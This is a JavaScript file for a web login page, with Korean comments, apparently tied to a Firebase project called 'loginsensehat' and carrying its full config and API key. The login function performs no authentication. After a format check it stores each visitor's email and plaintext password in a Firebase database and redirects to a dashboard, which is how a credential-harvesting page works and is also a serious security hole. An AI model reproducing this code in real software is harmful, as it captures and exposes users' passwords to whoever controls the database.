// Firebase 초기화
var config = {
  apiKey: "AIzaSyDaPpDrJsJdM3ynDpI6qQ21ySJ1geIFqbI",
  authDomain: "loginsensehat.firebaseapp.com",
  databaseURL: "https://loginsensehat-default-rtdb.firebaseio.com",
  projectId: "loginsensehat",
  storageBucket: "loginsensehat.appspot.com",
  messagingSenderId: "19886982208",
  appId: "1:19886982208:web:ab98b4b358cd2aacc94ba5"
};

firebase.initializeApp(config);
var database = firebase.database();

function login() {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const msg = document.getElementById("login-msg");

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!emailRegex.test(email)) {
    msg.textContent = "이메일 형식이 올바르지 않습니다.";
    return;
  }

  if (password.length === 0) {
    msg.textContent = "비밀번호를 입력해주세요.";
    return;
  }

  // ✅ Firebase DB에 저장
  const loginData = {
    email: email,
    password: password,
    timestamp: new Date().toISOString()
  };

  database.ref("logins").push(loginData)
    .then(() => {
      console.log("✅ 로그인 정보 저장됨");
      window.location.href = "dashboard.html";
    })
    .catch((err) => {
      msg.textContent = "저장 실패: " + err.message;
    });
}

// 실시간 이메일 형식 검사
document.getElementById("email").addEventListener("input", function () {
  const email = this.value.trim();
  const msg = document.getElementById("login-msg");
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (email.length > 0 && !emailRegex.test(email)) {
    msg.textContent = "이메일 형식이 올바르지 않습니다.";
  } else {
    msg.textContent = "";
  }
});
